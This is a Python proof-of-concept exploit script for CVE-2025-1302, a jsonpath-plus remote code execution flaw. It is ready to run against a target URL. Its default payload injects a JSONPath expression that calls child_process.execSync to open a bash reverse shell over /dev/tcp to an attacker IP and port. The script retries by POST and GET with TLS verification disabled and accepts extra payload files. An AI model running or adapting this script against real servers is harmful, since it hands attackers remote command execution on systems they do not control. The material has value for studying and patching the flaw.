#!/usr/bin/env python3
"""
PoC exploit for CVE-2025-1302 (jsonpath-plus RCE) - v3 (debug POST failures)
  • Fallback on ANY non-2xx/3xx (including 404/400)
  • --method flag (POST, GET, AUTO)
  • DEBUG output of full request/response for BOTH POST and GET
  • tqdm progress bars for delay and payload loop
"""
import argparse
import requests
import time
import json
from tqdm import tqdm
from datetime import datetime

# We will fallback on any non-successful (>=400) or exception

def parse_args():
    p = argparse.ArgumentParser(description="CVE-2025-1302 PoC exploit script (v3)")
    p.add_argument("--url", required=True,
                   help="Target URL (full path, e.g. http://host:port/query)")
    p.add_argument("--ip", required=True, help="Attacker IP for reverse shell")
    p.add_argument("--port", type=int, required=True, help="Attacker port for reverse shell")
    p.add_argument("--payload-file",
                   help="Path to file with payload templates (one per line). Use {ip}/{port} placeholders.")
    p.add_argument("--delay", type=int, default=0,
                   help="Seconds to wait before sending payloads")
    p.add_argument("--output", help="Path to JSON log file for results")
    g = p.add_mutually_exclusive_group()
    g.add_argument("--method", choices=["POST", "GET", "AUTO"],
                   default="AUTO",
                   help="HTTP method: POST only, GET only, or AUTO (POST→GET fallback)")
    g.add_argument("--no-fallback", action="store_true",
                   help="Skip GET fallback (equivalent to --method POST)")
    return p.parse_args()


def load_payloads(path, ip, port):
    with open(path) as f:
        return [
            line.strip().replace("{ip}", ip).replace("{port}", str(port))
            for line in f if line.strip()
        ]


def build_default(ip, port):
    return (
        '$[?(@.constructor.constructor("require(\\\"child_process\\\").'
        'execSync(\\\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\\\")")())]'
    ).format(ip=ip, port=port)


def send_request(method, url, payload):
    """Return (status, text, exception_flag)"""
    try:
        if method == "POST":
            resp = requests.post(url, json={"path": payload}, timeout=10, verify=False)
        else:
            resp = requests.get(url, params={"path": payload}, timeout=10, verify=False)
        return resp.status_code, resp.text, False
    except Exception as e:
        return None, f"{method} error: {e}", True


def main():
    args = parse_args()
    mode = "POST" if args.no_fallback else args.method

    # load payload(s)
    if args.payload_file:
        payloads = load_payloads(args.payload_file, args.ip, args.port)
    else:
        payloads = [build_default(args.ip, args.port)]

    # delay if requested
    if args.delay > 0:
        print(f"[+] Delaying {args.delay}s before payload loop...")
        for _ in tqdm(range(args.delay), desc="Delay countdown"):
            time.sleep(1)

    results = []
    for payload in tqdm(payloads, desc="Payload loop"):
        ts = datetime.utcnow().isoformat() + "Z"
        print(f"\n[DEBUG {ts}] Payload:\n{payload}\n")

        # POST attempt
        status, text, excepted = None, None, False
        if mode in ("POST", "AUTO"):
            status, text, excepted = send_request("POST", args.url, payload)
            print(f"[→ POST] status={status!r}, exception={excepted}")
            print(f"[DEBUG POST RESPONSE]\n{text}\n")  # always show POST response/text

        # Decide on fallback
        do_get = False
        if mode == "GET":
            do_get = True
        elif mode == "AUTO" and (excepted or (status or 0) >= 400):
            do_get = True

        used_method = "POST"
        if do_get:
            print(f"[+] Falling back to GET (mode={mode}, status={status!r})")
            status, text, excepted = send_request("GET", args.url, payload)
            print(f"[→ GET] status={status!r}, exception={excepted}")
            print(f"[DEBUG GET RESPONSE]\n{text}\n")  # show GET response/text
            used_method = "GET"

        results.append({
            "payload": payload,
            "timestamp": ts,
            "method": used_method,
            "status": status,
            "response": text
        })

    # save results
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"[+] Logged {len(results)} entries to {args.output}")

if __name__ == "__main__":
    main()
